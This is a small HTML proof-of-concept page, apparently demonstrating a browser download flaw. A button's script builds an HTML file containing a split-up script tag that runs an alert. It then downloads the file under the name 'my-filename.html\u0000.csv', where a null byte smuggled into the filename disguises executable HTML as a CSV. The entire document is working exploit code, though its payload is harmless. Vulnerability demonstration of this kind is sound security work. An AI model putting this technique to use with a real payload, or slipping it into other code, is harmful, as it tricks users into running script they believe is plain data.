<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Download PoC</title>
</head>
<body>

<button onclick="run()">Download file</button>

<script>
function run() {
  const payload = "<html><body><scr" + "ipt>alert('hello')</scr" + "ipt></body></html>";

  const blob = new Blob(
    [payload],
    { type: "text/html" }
  );

  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = "my-filename.html\u0000.csv";

  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);

  URL.revokeObjectURL(a.href);
}
</script>

</body>
</html>
